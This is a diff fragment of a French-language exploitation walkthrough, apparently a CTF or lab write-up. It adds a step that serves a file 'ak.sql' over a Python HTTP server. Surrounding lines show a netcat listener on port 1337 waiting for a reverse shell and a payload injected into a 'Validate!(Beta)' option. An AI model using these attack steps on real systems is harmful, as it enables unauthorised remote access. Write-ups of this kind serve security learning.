@@ -93,6 +93,14 @@ nc -nvlp 1337
 listening on [any] 1337 ...
 ```
 
+Start un serveur python when est située votre fichier ak.sql :
+
+
+```sh
+sudo python -m SimpleHTTPServer
+```
+
+
 Et injecter votre payload sur l'option : ``"Validate!(Beta)"``.
 
 
